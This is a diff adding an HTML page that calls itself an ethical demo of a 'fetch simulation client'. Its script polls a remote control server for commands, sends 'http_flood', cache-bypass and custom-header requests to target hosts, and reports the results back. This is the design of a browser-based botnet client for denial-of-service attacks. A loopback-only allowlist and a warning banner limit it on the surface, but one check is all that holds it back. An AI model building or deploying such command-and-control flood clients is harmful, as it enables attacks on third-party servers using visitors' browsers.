@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GitHub Pages Fetch Sim Client (Ethical Demo)</title>
+  <style>
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px; background: #f8f9fa; color: #333; }
+    pre { background: #fff; padding: 15px; border: 1px solid #ddd; border-radius: 8px; max-height: 60vh; overflow-y: auto; white-space: pre-wrap; font-size: 0.9em; }
+    h2 { color: #007bff; border-bottom: 2px solid #eee; padding-bottom: 10px; }
+    .warning { background: #ffe0e0; border: 1px solid #dc3545; color: #dc3545; padding: 15px; border-radius: 8px; margin-bottom: 25px; text-align: center; }
+    .config-info { background: #e2f0fe; border: 1px solid #007bff; color: #007bff; padding: 10px; border-radius: 5px; margin-top: 15px; font-size: 0.9em; }
+  </style>
+</head>
+<body>
+  <div class="warning">
+    <h3>ETHICAL DEMONSTRATION ONLY</h3>
+    <p>This client demonstrates controlled network testing. NO malicious activity is performed. All requests target pre-approved IPs (loopback only).</p>
+  </div>
+
+  <h2>GitHub Pages Fetch Simulation Client</h2>
+  <div class="config-info">
+    <p><strong>Control Server:</strong> <code id="server-url-display">Loading...</code></p>
+    <p><strong>Allowed Targets:</strong> <code>127.x.x.x (loopback only)</code></p>
+  </div>
+  <pre id="log">Initializing...</pre>
+
+  <script>
+    const SERVER = "https://wuhp-notac2.hf.space";
+    const SIM_ALLOWED_TARGETS = ["localhost"];
+    
+    document.getElementById("server-url-display").textContent = SERVER;
+
+    function log(msg) {
+      const el = document.getElementById("log");
+      el.textContent += `\n${new Date().toLocaleTimeString()} - ${msg}`;
+      el.scrollTop = el.scrollHeight;
+    }
+
+    function validateTargetIp(ip) {
+      return ip.startsWith("127.") || SIM_ALLOWED_TARGETS.includes(ip);
+    }
+
+    async function executeFetch(type, ip, port, simHeaders) {
+      if (!validateTargetIp(ip)) {
+        log(`Blocked: IP '${ip}' not allowlisted`);
+        return { status: "blocked_by_client_allowlist", target_ip: ip };
+      }
+      const base = `http://${ip}:${port}/`;
+      const opts = { method: "GET", headers: simHeaders, mode: "cors", cache: "no-store" };
+      const t0 = performance.now();
+      try {
+        let response;
+        if (type === "fetch_http_flood") {
+          log(`HTTP GET to ${base}`);
+          response = await fetch(base, opts);
+          const txt = await response.text();
+          return { status: `status_${response.status}`, latency_ms: performance.now() - t0, bytes: new Blob([txt]).size, protocol: "http" };
+        } else if (type === "fetch_cache_bypass") {
+          const k = Math.random().toString(36).substring(2, 10);
+          const url = `${base}?_cache_bust=${k}&_=${Date.now()}`;
+          log(`Cache-bypass GET to ${url}`);
+          response = await fetch(url, opts);
+          const txt = await response.text();
+          return { status: "success", latency_ms: performance.now() - t0, bytes: new Blob([txt]).size, cache_key: k, protocol: "http" };
+        } else if (type === "fetch_custom_headers") {
+          opts.headers = { ...simHeaders, "X-Custom-Test": "sim_payload", "Accept": "application/json" };
+          log(`Custom headers GET to ${base}`);
+          response = await fetch(base, opts);
+          return { status: `status_${response.status}`, latency_ms: performance.now() - t0, protocol: "http" };
+        }
+        return { status: "unsupported_fetch_type", type: type };
+      } catch (e) {
+        log(`Fetch error: ${e.message}`);
+        return { status: "fetch_error", detail: e.message };
+      }
+    }
+
+    async function poll() {
+      try {
+        const cmdResponse = await fetch(`${SERVER}/api/poll_command`).then(r => r.json());
+        if (cmdResponse.status === "idle") { setTimeout(poll, 2000); return; }
+        const cmd = cmdResponse;
+        const { id, type, ip, port, simulation_headers } = cmd;
+        log(`Command (ID=${id}): ${type} -> ${ip}:${port}`);
+        if (!type.startsWith("fetch_")) {
+          const report = { client: "gh_pages", command_id: id, type, target: `${ip}:${port}`, requests_sent: 0, result: { status: "unsupported_by_browser" }, timestamp: Date.now()/1000 };
+          await fetch(`${SERVER}/api/report`, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(report) });
+          setTimeout(poll, 2000); return;
+        }
+        const result = await executeFetch(type, ip, port, simulation_headers);
+        const report = { client: "gh_pages", command_id: id, type, target: `${ip}:${port}`, requests_sent: 1, result, timestamp: Date.now()/1000 };
+        await fetch(`${SERVER}/api/report`, { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(report) });
+        log(`Report: Status=${result.status}`);
+      } catch (e) { log(`Error: ${e.message}`); }
+      setTimeout(poll, 2000);
+    }
+    log("Client Ready. Polling...");
+    poll();
+  </script>
+</body>
+</html>
